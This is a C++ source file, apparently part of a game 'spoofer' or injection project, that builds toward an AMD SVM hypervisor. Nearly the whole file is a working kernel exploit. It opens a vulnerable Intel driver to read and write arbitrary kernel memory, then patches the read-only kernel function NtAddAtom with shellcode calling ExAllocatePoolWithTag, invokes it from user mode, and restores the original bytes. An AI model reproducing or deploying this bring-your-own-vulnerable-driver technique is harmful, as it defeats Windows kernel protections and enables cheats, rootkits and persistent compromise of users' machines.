ãn// SVMHypervisorV4.cpp
// Step 4: Allocate kernel pool memory for VMCB
// Just allocation - no VMRUN yet

#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <intrin.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

typedef LONG NTSTATUS;
#define NTAPI __stdcall

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")

#define IOCTL_INTEL_COPY 0x80862007

typedef struct _COPY_MEMORY_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t source;
  uint64_t destination;
  uint64_t length;
} COPY_MEMORY_BUFFER_INFO;

typedef struct _GET_PHYS_ADDRESS_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t return_physical_address;
  uint64_t address_to_translate;
} GET_PHYS_ADDRESS_BUFFER_INFO;

typedef struct _MAP_IO_SPACE_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t return_value;
  uint64_t return_virtual_address;
  uint64_t physical_address_to_map;
  uint32_t size;
} MAP_IO_SPACE_BUFFER_INFO;

typedef struct _UNMAP_IO_SPACE_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t reserved2;
  uint64_t virt_address;
  uint64_t reserved3;
  uint32_t number_of_bytes;
} UNMAP_IO_SPACE_BUFFER_INFO;

extern "C" {
NTSTATUS NTAPI NtQuerySystemInformation(ULONG, PVOID, ULONG, PULONG);
NTSTATUS NTAPI NtAddAtom(PVOID, ULONG, PUSHORT);
}

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
  HANDLE Section;
  PVOID MappedBase;
  PVOID ImageBase;
  ULONG ImageSize;
  ULONG Flags;
  USHORT LoadOrderIndex;
  USHORT InitOrderIndex;
  USHORT LoadCount;
  USHORT OffsetToFileName;
  UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
  ULONG NumberOfModules;
  RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

HANDLE hDevice = INVALID_HANDLE_VALUE;
uint64_t ntoskrnlBase = 0;
uint64_t kernelNtAddAtom = 0;
uint64_t kernelExAllocatePool = 0;

// ==================== Memory Operations ====================

bool MemCopy(uint64_t dest, uint64_t src, uint64_t size) {
  COPY_MEMORY_BUFFER_INFO info = {0};
  info.case_number = 0x33;
  info.source = src;
  info.destination = dest;
  info.length = size;

  DWORD bytesReturned = 0;
  return DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info),
                         nullptr, 0, &bytesReturned, nullptr) != FALSE;
}

bool ReadMemory(uint64_t address, void *buffer, uint64_t size) {
  if (size > 0x1000)
    size = 0x1000;
  void *pinnedBuffer =
      VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pinnedBuffer)
    return false;
  VirtualLock(pinnedBuffer, 0x1000);

  bool result = MemCopy((uint64_t)pinnedBuffer, address, size);
  if (result)
    memcpy(buffer, pinnedBuffer, size);

  VirtualUnlock(pinnedBuffer, 0x1000);
  VirtualFree(pinnedBuffer, 0, MEM_RELEASE);
  return result;
}

bool GetPhysicalAddress(uint64_t address, uint64_t *outPhys) {
  GET_PHYS_ADDRESS_BUFFER_INFO info = {0};
  info.case_number = 0x25;
  info.address_to_translate = address;

  DWORD bytesReturned = 0;
  if (!DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info), &info,
                       sizeof(info), &bytesReturned, nullptr))
    return false;

  *outPhys = info.return_physical_address;
  return true;
}

uint64_t MapIoSpace(uint64_t physAddr, uint32_t size) {
  MAP_IO_SPACE_BUFFER_INFO info = {0};
  info.case_number = 0x19;
  info.physical_address_to_map = physAddr;
  info.size = size;

  DWORD bytesReturned = 0;
  if (!DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info), &info,
                       sizeof(info), &bytesReturned, nullptr))
    return 0;

  return info.return_virtual_address;
}

bool UnmapIoSpace(uint64_t virtAddr, uint32_t size) {
  UNMAP_IO_SPACE_BUFFER_INFO info = {0};
  info.case_number = 0x1A;
  info.virt_address = virtAddr;
  info.number_of_bytes = size;

  DWORD bytesReturned = 0;
  return DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info),
                         nullptr, 0, &bytesReturned, nullptr) != FALSE;
}

bool WriteToReadOnlyMemory(uint64_t address, void *buffer, uint32_t size) {
  uint64_t physAddr = 0;
  if (!GetPhysicalAddress(address, &physAddr) || physAddr == 0)
    return false;

  uint64_t mappedAddr = MapIoSpace(physAddr, size);
  if (!mappedAddr)
    return false;

  void *pinnedBuffer =
      VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pinnedBuffer) {
    UnmapIoSpace(mappedAddr, size);
    return false;
  }
  memcpy(pinnedBuffer, buffer, size);
  VirtualLock(pinnedBuffer, 0x1000);

  bool result = MemCopy(mappedAddr, (uint64_t)pinnedBuffer, size);

  VirtualUnlock(pinnedBuffer, 0x1000);
  VirtualFree(pinnedBuffer, 0, MEM_RELEASE);
  UnmapIoSpace(mappedAddr, size);
  return result;
}

uint64_t GetKernelModuleBase(const char *moduleName,
                             uint32_t *outSize = nullptr) {
  ULONG size = 0;
  NtQuerySystemInformation(11, nullptr, 0, &size);
  PRTL_PROCESS_MODULES modules = (PRTL_PROCESS_MODULES)malloc(size);
  if (!modules)
    return 0;

  if (NtQuerySystemInformation(11, modules, size, &size) != 0) {
    free(modules);
    return 0;
  }

  uint64_t base = 0;
  for (ULONG i = 0; i < modules->NumberOfModules; i++) {
    char *name = (char *)modules->Modules[i].FullPathName +
                 modules->Modules[i].OffsetToFileName;
    if (_stricmp(name, moduleName) == 0) {
      base = (uint64_t)modules->Modules[i].ImageBase;
      if (outSize)
        *outSize = modules->Modules[i].ImageSize;
      break;
    }
  }
  free(modules);
  return base;
}

uint64_t GetKernelExport(uint64_t moduleBase, const char *exportName) {
  IMAGE_DOS_HEADER dosHeader;
  IMAGE_NT_HEADERS64 ntHeaders;

  if (!ReadMemory(moduleBase, &dosHeader, sizeof(dosHeader)))
    return 0;
  if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE)
    return 0;

  if (!ReadMemory(moduleBase + dosHeader.e_lfanew, &ntHeaders,
                  sizeof(ntHeaders)))
    return 0;
  if (ntHeaders.Signature != IMAGE_NT_SIGNATURE)
    return 0;

  uint32_t exportRva =
      ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
          .VirtualAddress;
  uint32_t exportSize =
      ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
  if (!exportRva || !exportSize)
    return 0;

  uint32_t readSize = (exportSize < 0x40000) ? exportSize : 0x40000;
  BYTE *exportData = (BYTE *)VirtualAlloc(
      nullptr, readSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!exportData)
    return 0;

  for (uint32_t offset = 0; offset < readSize; offset += 0x1000) {
    uint32_t chunkSize =
        ((readSize - offset) < 0x1000) ? (readSize - offset) : 0x1000;
    ReadMemory(moduleBase + exportRva + offset, exportData + offset, chunkSize);
  }

  IMAGE_EXPORT_DIRECTORY *exportDir = (IMAGE_EXPORT_DIRECTORY *)exportData;
  uint64_t delta = (uint64_t)exportData - exportRva;
  if (exportDir->AddressOfNames < exportRva ||
      exportDir->AddressOfNames >= exportRva + readSize) {
    VirtualFree(exportData, 0, MEM_RELEASE);
    return 0;
  }

  uint32_t *nameTable = (uint32_t *)(exportDir->AddressOfNames + delta);
  uint16_t *ordinalTable =
      (uint16_t *)(exportDir->AddressOfNameOrdinals + delta);
  uint32_t *funcTable = (uint32_t *)(exportDir->AddressOfFunctions + delta);

  uint64_t result = 0;
  for (uint32_t i = 0; i < exportDir->NumberOfNames && i < 10000; i++) {
    uint32_t nameRva = nameTable[i];
    if (nameRva < exportRva || nameRva >= exportRva + readSize)
      continue;
    char *funcName = (char *)(nameRva + delta);
    if (strcmp(funcName, exportName) == 0) {
      result = moduleBase + funcTable[ordinalTable[i]];
      break;
    }
  }
  VirtualFree(exportData, 0, MEM_RELEASE);
  return result;
}

// ==================== Shellcode to call ExAllocatePoolWithTag
// ==================== ExAllocatePoolWithTag(POOL_TYPE PoolType, SIZE_T
// NumberOfBytes, ULONG Tag) PoolType: NonPagedPool = 0 We return the allocated
// address in RAX

uint8_t original_kernel_function[128];

// This shellcode calls ExAllocatePoolWithTag(0, 0x1000, 'MVSS')
// and returns the result
uint8_t allocPoolShellcode[] = {
    // Save registers
    0x55,                   // push rbp
    0x48, 0x89, 0xE5,       // mov rbp, rsp
    0x48, 0x83, 0xEC, 0x30, // sub rsp, 0x30 (shadow space + alignment)

    // Call ExAllocatePoolWithTag(0, 0x1000, 'MVSS')
    // rcx = PoolType = 0 (NonPagedPool)
    // rdx = Size = 0x1000
    // r8d = Tag = 'MVSS' = 0x5353564D
    0x48, 0x31, 0xC9,                         // xor rcx, rcx (PoolType = 0)
    0x48, 0xC7, 0xC2, 0x00, 0x10, 0x00, 0x00, // mov rdx, 0x1000 (size)
    0x41, 0xB8, 0x4D, 0x56, 0x53, 0x53,       // mov r8d, 'MVSS' (tag)

    // mov rax, ExAllocatePoolWithTag address (will be patched)
    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, // +29: address placeholder

    // call rax
    0xFF, 0xD0, // call rax

    // Result is in rax, return it
    0x48, 0x89, 0xEC, // mov rsp, rbp
    0x5D,             // pop rbp
    0xC3              // ret
};

#define ALLOC_POOL_ADDR_OFFSET                                                 \
  31 // Offset where ExAllocatePoolWithTag address goes

// ==================== CPU Checks ====================

bool CheckAmdCpu() {
  int regs[4];
  __cpuid(regs, 0);
  return (regs[1] == 'htuA' && regs[3] == 'itne' && regs[2] == 'DMAc');
}

bool CheckSvmSupport() {
  int regs[4];
  __cpuid(regs, 0x80000001);
  return (regs[2] & (1 << 2)) != 0;
}

bool CheckHypervisorPresent() {
  int regs[4];
  __cpuid(regs, 1);
  return (regs[2] & (1 << 31)) != 0;
}

// ==================== Main ====================

int main() {
  printf("================================================================\n");
  printf("       SVM HYPERVISOR V4 - Allocate Kernel Pool Memory         \n");
  printf("    Step 4: Call ExAllocatePoolWithTag for VMCB               \n");
  printf(
      "================================================================\n\n");

  printf("=== CPU Check ===\n");
  if (!CheckAmdCpu()) {
    printf("[-] Not AMD CPU!\n");
    return 1;
  }
  printf("[+] AMD CPU\n");

  printf("\n=== Intel Driver ===\n");
  hDevice = CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr,
                        OPEN_EXISTING, 0, nullptr);
  if (hDevice == INVALID_HANDLE_VALUE) {
    printf("[-] Intel driver not running!\n");
    return 1;
  }
  printf("[+] Intel driver opened\n");

  ntoskrnlBase = GetKernelModuleBase("ntoskrnl.exe");
  if (!ntoskrnlBase) {
    printf("[-] ntoskrnl not found!\n");
    CloseHandle(hDevice);
    return 1;
  }
  printf("[+] ntoskrnl: 0x%llX\n", ntoskrnlBase);

  kernelNtAddAtom = GetKernelExport(ntoskrnlBase, "NtAddAtom");
  if (!kernelNtAddAtom) {
    printf("[-] NtAddAtom not found!\n");
    CloseHandle(hDevice);
    return 1;
  }
  printf("[+] NtAddAtom: 0x%llX\n", kernelNtAddAtom);

  kernelExAllocatePool = GetKernelExport(ntoskrnlBase, "ExAllocatePoolWithTag");
  if (!kernelExAllocatePool) {
    printf("[-] ExAllocatePoolWithTag not found!\n");
    CloseHandle(hDevice);
    return 1;
  }
  printf("[+] ExAllocatePoolWithTag: 0x%llX\n", kernelExAllocatePool);

  printf("\n=== Preparing Allocation Shellcode ===\n");

  // Patch the shellcode with ExAllocatePoolWithTag address
  uint8_t patchedShellcode[sizeof(allocPoolShellcode)];
  memcpy(patchedShellcode, allocPoolShellcode, sizeof(allocPoolShellcode));
  *(uint64_t *)&patchedShellcode[ALLOC_POOL_ADDR_OFFSET] = kernelExAllocatePool;

  printf("[+] Shellcode prepared (%zu bytes)\n", sizeof(patchedShellcode));
  printf("[*] ExAllocatePoolWithTag patched at offset %d\n",
         ALLOC_POOL_ADDR_OFFSET);

  // Backup original NtAddAtom
  if (!ReadMemory(kernelNtAddAtom, original_kernel_function,
                  sizeof(patchedShellcode))) {
    printf("[-] Failed to backup NtAddAtom\n");
    CloseHandle(hDevice);
    return 1;
  }
  printf("[+] Backed up original bytes\n");

  printf("\n=== Executing Allocation ===\n");
  printf(
      "[*] Calling ExAllocatePoolWithTag(NonPagedPool, 0x1000, 'MVSS')...\n");

  // Write shellcode
  if (!WriteToReadOnlyMemory(kernelNtAddAtom, patchedShellcode,
                             sizeof(patchedShellcode))) {
    printf("[-] Failed to write shellcode\n");
    CloseHandle(hDevice);
    return 1;
  }

  // Call NtAddAtom - executes our shellcode
  USHORT atom = 0;
  NTSTATUS result = NtAddAtom(nullptr, 0, &atom);

  // Restore IMMEDIATELY
  WriteToReadOnlyMemory(kernelNtAddAtom, original_kernel_function,
                        sizeof(patchedShellcode));
  printf("[+] Restored NtAddAtom\n");

  // The result is actually the allocated address (in NTSTATUS return)
  uint64_t allocatedAddr =
      (uint64_t)(uint32_t)result; // NtAddAtom returns NTSTATUS (32-bit signed)

  // Actually for kernel addresses, we need to handle this differently
  // The syscall returns value in rax, but NtAddAtom signature only uses lower
  // 32 bits
  printf("\n=== Result ===\n");
  printf("[*] Raw return: 0x%X\n", result);

  if (result == 0) {
    printf("[!] Allocation returned 0 - failed or returned address is 0\n");
    printf("    This could mean ExAllocatePoolWithTag call failed.\n");
  } else if ((int32_t)result < 0) {
    printf("[!] Got negative value - might be NTSTATUS error\n");
  } else {
    printf("[+] Got non-zero result - allocation might have worked!\n");
    printf("    But we need to capture full 64-bit address.\n");
  }

  printf("\n[*] Hypervisor present: %s\n",
         CheckHypervisorPresent() ? "YES" : "NO");
  printf("\nNOTE: Next step is to capture full 64-bit allocated address.\n");

  CloseHandle(hDevice);
  return 0;
}
ãn*cascade082.file:///C:/inject/Spoofers/SVMHypervisorV4.cpp